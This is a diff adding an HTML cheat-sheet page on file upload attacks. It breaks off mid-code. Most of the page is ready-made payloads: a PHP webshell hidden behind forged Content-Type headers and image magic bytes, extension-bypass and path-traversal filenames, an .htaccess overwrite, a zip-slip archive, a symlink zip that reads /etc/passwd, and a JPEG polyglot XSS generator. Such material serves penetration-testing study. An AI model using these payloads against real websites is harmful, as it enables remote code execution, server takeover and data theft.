@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>File Upload Attack - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "File Upload Attack", url: "#_top", children: [
+              {title: "Check Allowed File Formats", url: "#check-allowed-file-formats" },
+              {title: "Bypass File Extension Validation", url: "#bypass-file-extension-validation" },
+              {title: "Bypass Content-Type Validation", url: "#bypass-content-type-validation" },
+              {title: "Change Upload Location by Filename", url: "#change-upload-location-by-filename" },
+              {title: "Overwrite Server Configuration", url: "#overwrite-server-configuration" },
+              {title: "Magic Bytes", url: "#magic-bytes" },
+              {title: "Zip", url: "#zip" },
+              {title: "JPEG Polyglot XSS", url: "#jpeg-polyglot-xss" },
+              {title: "Malicious Filnames", url: "#malicious-filnames" },
+              {title: "Race Condition Attack", url: "#race-condition-attack" },
+              {title: "PHP Payloads", url: "#php-payloads" },
+              {title: "Other Tips", url: "#other-tips" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="file-upload-attack">File Upload Attack</h1>
+<p>It is often used for gaining access to the target shell using Reverse Shell, or getting sensitive information using Remote Code Execution (RCE).</p>
+<div class="language-text highlight"><pre><span></span><code>- [docstore.mik.ua](https://docstore.mik.ua/orelly/web2/wdesign/ch19_01.htm)
+- [exploiting-auto-save](https://saadahmedx.medium.com/exploiting-auto-save-functionality-to-steal-login-credentials-bf4c7e1594da)
+</code></pre></div>
+<h2 id="check-allowed-file-formats">Check Allowed File Formats</h2>
+<p>First off, we need to know what file types are allowed to be uploaded in target website.<br />
+Try to upload any formats.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>.php, .php3, .php4, .php5, .phtml, .phar
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>.jpg, jpeg, .png, .gif
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>.bmp
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>.pdf
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>.js
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>.exe, .dll, .asp, .aspx
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>.py
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>.go
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>.rs
+</span></code></pre></div>
+<h3 id="create-blank-files-for-each-format">Create Blank Files for Each Format</h3>
+<p>To create a blank file for the checking purpose, execute the following command.  </p>
+<ul>
+<li><strong>jpg, png</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># https://superuser.com/questions/294943/is-there-a-utility-to-create-blank-images
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>convert -size 32x32 xc:white test.jpg
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>convert -size 32x32 xc:white test.png
+</span></code></pre></div>
+<ul>
+<li><strong>pdf</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a># https://unix.stackexchange.com/questions/277892/how-do-i-create-a-blank-pdf-from-the-command-line
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>convert xc:none -page Letter a.pdf
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="bypass-file-extension-validation">Bypass File Extension Validation</h2>
+<p>We might be able to bypass file extension validation by modifying the filename.<br />
+For example, if we cannot upload  a pure <strong><code>.php</code></strong> file extension, tweak the filename a bit as below.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>exploit.php
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>exploit.php3
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>exploit.php4
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>exploit.php5
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>exploit.phtml
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>exploit.phar
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>exploit.jpg.php
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>exploit.jpeg.php
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>exploit.png.php
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>exploit.gif.php
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>exploit.pdf.php
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>exploit.php.
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>exploit.php.jpg
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>exploit.php.jpeg
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>exploit.php.png
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>exploit%2Ephp
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>exploit.p.phphp
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>exploit.php%00.jpg
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>exploit.php%0d%0a.jpg
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>
+</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>exploit.PHP
+</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>exploit.pHp
+</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>
+</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>exploit.php/
+</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>exploit.php//
+</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>exploit.php\
+</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>exploit.php#
+</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>exploit..php
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="bypass-content-type-validation">Bypass Content-Type Validation</h2>
+<p>We might be able to bypass the content type validation by modifying that.<br />
+For example, assume that we want to upload <strong><code>PHP</code></strong> file to execute <strong>webshell</strong> or <strong>reverse shell</strong>, but <code>PHP</code> files are rejected by the website.<br />
+In this situation, we might be able to bypass the validation by modifying the <strong>"Content-Type"</strong> from <strong>"application/x-php"</strong> to other types such as <strong>"image/jpeg"</strong>, <strong>"plain/text"</strong> etc.<br />
+Here is the example.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>------abcdefghijk
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;exploit.php&quot;
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>Content-Type: image/jpeg &lt;!-- Change this. Try other types such as image/gif, plain/text, etc. --&gt;
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>------abcdefghijk
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="change-upload-location-by-filename">Change Upload Location by Filename</h2>
+<p>We might be able to upload our file to <strong>unintended location</strong> by path traversing with filename e.g. <strong><code>../example.php</code></strong> or <strong><code>..%2Fexample.php</code></strong>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>------abcdefghijk
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;..%2fexploit.php&quot; &lt;!-- Change this. --&gt;
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>Content-Type: application/x-php
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>------abcdefghijk
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="overwrite-server-configuration">Overwrite Server Configuration</h2>
+<p>We might be able to overwrite the web server configuration file such as <strong>".htaccess"</strong>, <strong>".htpasswd"</strong> by specifying the filename to the name of the config file and write desired contents of that.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>------abcdefghijk
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;.htaccess&quot; &lt;!-- Specify the name of config file --&gt;
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>Content-Type: text/plain
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>AddType application/x-httpd-php .abc
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>------abcdefghijk
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="magic-bytes">Magic Bytes</h2>
+<p>Reference: <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Wikipedia</a></p>
+<p>If the website checks the magic byte of the uploaded file for allowing only image files to be uploaded, we might be able to bypass this validation by adding magic bytes before the actual payload.  </p>
+<p>The <strong><code>exif_imagetype()</code></strong> PHP function is likely to be used for such validation.<br />
+In addition, we may need to change other values such as <strong>"Content-Type"</strong> depending on the situation.</p>
+<h3 id="png">PNG</h3>
+<table>
+<thead>
+<tr>
+<th>Hex Signature</th>
+<th>ISO 8859-1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>89 50 4E 47 0D 0A 1A 0A</code></td>
+<td><code>‰PNG␍␊␚␊</code></td>
+</tr>
+</tbody>
+</table>
+<p>Payload example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>‰PNG␍␊␚␊
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;
+</span></code></pre></div>
+<h3 id="jpgjpeg">JPG/JPEG</h3>
+<table>
+<thead>
+<tr>
+<th>Hex Signature</th>
+<th>ISO 8859-1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>FF D8 FF EE</code></td>
+<td><code>ÿØÿî</code></td>
+</tr>
+<tr>
+<td><code>FF D8 FF E0</code></td>
+<td><code>ÿØÿà</code></td>
+</tr>
+<tr>
+<td><code>FF D8 FF E0 00 10 4A 46 49 46 00 01</code></td>
+<td><code>ÿØÿà␀␐JFIF␀␁</code></td>
+</tr>
+</tbody>
+</table>
+<p>Payload example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>ÿØÿî
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>// or
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>ÿØÿà
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>// or
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>ÿØÿà␀␐JFIF␀␁
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;
+</span></code></pre></div>
+<h3 id="pdf">PDF</h3>
+<table>
+<thead>
+<tr>
+<th>Hex Signature</th>
+<th>ISO 8859-1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>25 50 44 46 2D</code></td>
+<td><code>%PDF-</code></td>
+</tr>
+</tbody>
+</table>
+<p>Payload example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>%PDF-
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;
+</span></code></pre></div>
+<h3 id="gif">GIF</h3>
+<p>Reference: <a href="https://docstore.mik.ua/orelly/web2/wdesign/ch19_01.htm">Web Design in a Nutshell</a></p>
+<ul>
+<li><strong>GIF87a</strong>: The original format for indexed color images. It uses LZW compression and has the option of being interlaced.</li>
+<li><strong>GIF89a</strong>: Is the same as <strong>GIF87a</strong> but also includes transparancy and animation capabilities.</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Hex Signature</th>
+<th>ISO 8859-1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>47 49 46 38 37 61</code></td>
+<td><code>GIF87a</code></td>
+</tr>
+<tr>
+<td><code>47 49 46 38 39 61</code></td>
+<td><code>GIF89a</code></td>
+</tr>
+</tbody>
+</table>
+<p>Payload example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>GIF87a
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>// or
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>GIF89a
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;
+</span></code></pre></div>
+<h3 id="riff-wave">RIFF WAVE</h3>
+<table>
+<thead>
+<tr>
+<th>Hex Signature</th>
+<th>ISO 8859-1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>52 49 46 46 ?? ?? ?? ?? 57 41 56 45</code></td>
+<td><code>RIFF????WAVE</code></td>
+</tr>
+</tbody>
+</table>
+<p>Payload example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>RIFF????WAVE
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="zip">Zip</h2>
+<p>If target website restricts uploads to zip files only, the website (server) may unzip uploaded files internally and displays the result of decompressed file somewhere e.g. <code>/upload/example.txt</code>.</p>
+<h3 id="zip-slip">Zip Slip</h3>
+<p>Create a file containing ‘../’ in the filename, and compress this file.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>echo &#39;&lt;?php echo system(&quot;id&quot;);?&gt;&#39; &gt; &#39;../test.php&#39;
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>zip test.zip &#39;../test.php&#39;
+</span></code></pre></div>
+<p>After uploading the zip file, target website (server) will decompress this file and may store the <code>test.php</code> file into unexpected directory.</p>
+<h3 id="lfi-with-symlinks">LFI with Symlinks</h3>
+<p>In local machine, create a symbolic link for a sensitive file. Then compress the symlink with <code>zip</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>ln -s /etc/passwd passwd.txt
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>zip --symlink test.zip passwd.txt
+</span></code></pre></div>
+<p>When we upload the zip file to target website, the website decompress the zip file and may display the file of the symbolic link (<code>/etc/passwd</code>, etc.). In short, we may be able to see the contents of the sensitive file.</p>
+<p><br /></p>
+<h2 id="jpeg-polyglot-xss">JPEG Polyglot XSS</h2>
+<p>Reference: <a href="https://infosecwriteups.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a">https://infosecwriteups.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a</a></p>
+<p>We may be able to inject XSS by inserting arbitrary JavaScript code into a JPEG file.<br />
+We can generate automatically a polyglot JPEG with <a href="https://github.com/s-3ntinel/imgjs_polygloter">imgjs_polygloter</a>.</p>
+<p>Below is the manual exploitation flow.</p>
+<h3 id="1-prepare-jpeg-image">1. Prepare JPEG Image</h3>
+<p>Here we create a blank JPEG image using <code>convert</code> command.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>convert -size 100x100 xc:white evil.jpg
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a># Backup for reproduction
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>cp evil.jpg evil_original.jpg
+</span></code></pre></div>
+<h3 id="2-create-xss-payload-in-hex">2. Create XSS Payload in Hex</h3>
+<p>We will insert the following JavaScript code.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>*/=alert(&quot;test&quot;);/*
+</span></code></pre></div>
+<p>To insert it into JPEG file, we need to convert this to HEX as below:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>2A 2F 3D 61 6C 65 72 74 28 22 74 65 73 74 22 29 3B 2F 2A
+</span></code></pre></div>
+<h3 id="3-start-hex-editor">3. Start Hex Editor</h3>
+<p>Start Hex editor to modify our <code>evil.jpg</code>. We use <code>ghex</code> here but you can use your favorite HEX editor.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>ghex evil.jpg
+</span></code></pre></div>
+<p>The original hex representation of the <code>evil.jpg</code> is as such follow:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 48 00 ...
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a># Details of the Hex
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a># FF D8: Start of image
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a># FF E0: Application default header
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a># 00 10: The length of the JPEG header (`00 10` represents 16 bytes)
+</span></code></pre></div>
+<h3 id="4-insert-our-javascript-into-jpeg-file">4. Insert Our JavaScript into JPEG File</h3>
+<p>Now start inserting our payload.<br />
+First we replace <code>00 10</code> after <code>FF D8 FF E0</code> with our <code>2F 2A (/*)</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 ...
+</span></code></pre></div>
+<p>By this, the length of the JPEG header is <strong>12074 bytes</strong> (<code>0x2F2A</code> in decimal).</p>
+<p>Since the size of our payload is <strong>19 bytes</strong> as below:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>python3
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>&gt;&gt;&gt; payload = b&#39;*/=alert(&quot;test&quot;);/*&#39;
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>&gt;&gt;&gt; len(payload)
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>19
+</span></code></pre></div>
+<p>We need to pad out the remaining <strong>12042 bytes</strong> (<strong>12074 - 16 - 19</strong>) with nulls.<br />
+Below is the Python code example to generate a polyglot JPEG file, which refers to <a href="https://github.com/simplylu/jpeg_polyglot_xss/blob/main/exploit.py">https://github.com/simplylu/jpeg_polyglot_xss/blob/main/exploit.py</a>. </p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;*/=alert(&quot;test&quot;);/*&#39;</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">input_file</span> <span class="o">=</span> <span class="s1">&#39;evil_original.jpg&#39;</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="n">output_file</span> <span class="o">=</span> <span class="s1">&#39;evil.jpg&#39;</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="n">a</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="c1"># Get the length of the header</span>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="n">header_size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">hex</span><span class="p">()[</span><span class="mi">8</span><span class="p">:</span><span class="mi">12</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="n">new_header_size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">hex</span><span class="p">()[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span><span class="o">+</span><span class="n">payload</span><span class="o">.</span><span class="n">hex</span><span class="p">()[:</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="c1"># Calculate the size of nulls for padding</span>
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="n">null_size</span> <span class="o">=</span> <span class="n">new_header_size</span> <span class="o">-</span> <span class="n">header_size</span> <span class="o">-</span> <span class="mi">16</span>
